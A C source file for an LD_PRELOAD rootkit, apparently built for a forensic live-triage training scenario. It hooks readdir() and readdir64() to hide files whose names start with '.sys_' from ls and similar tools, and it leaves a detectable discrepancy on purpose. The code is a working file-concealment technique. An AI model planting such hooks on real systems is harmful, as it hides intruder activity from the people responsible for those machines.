/* Benign userspace readdir-hook rootkit for the live-triage scenario.
   Hides directory entries beginning with ".sys_" from libc readdir(), so `ls`
   and tools that use readdir() don't show the operator's files. It does NOT hide
   from the getdents syscall, so a shell glob (echo /tmp/.sys_*), /proc, or an
   un-preloaded binary still reveals them - that discrepancy is the intended tell. */
#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>

#define HIDE_PREFIX ".sys_"

static struct dirent *(*real_readdir)(DIR *) = 0;
static struct dirent64 *(*real_readdir64)(DIR *) = 0;

struct dirent *readdir(DIR *d) {
    if (!real_readdir) real_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *e;
    while ((e = real_readdir(d)))
        if (strncmp(e->d_name, HIDE_PREFIX, sizeof(HIDE_PREFIX) - 1) != 0)
            return e;
    return 0;
}

struct dirent64 *readdir64(DIR *d) {
    if (!real_readdir64) real_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    struct dirent64 *e;
    while ((e = real_readdir64(d)))
        if (strncmp(e->d_name, HIDE_PREFIX, sizeof(HIDE_PREFIX) - 1) != 0)
            return e;
    return 0;
}
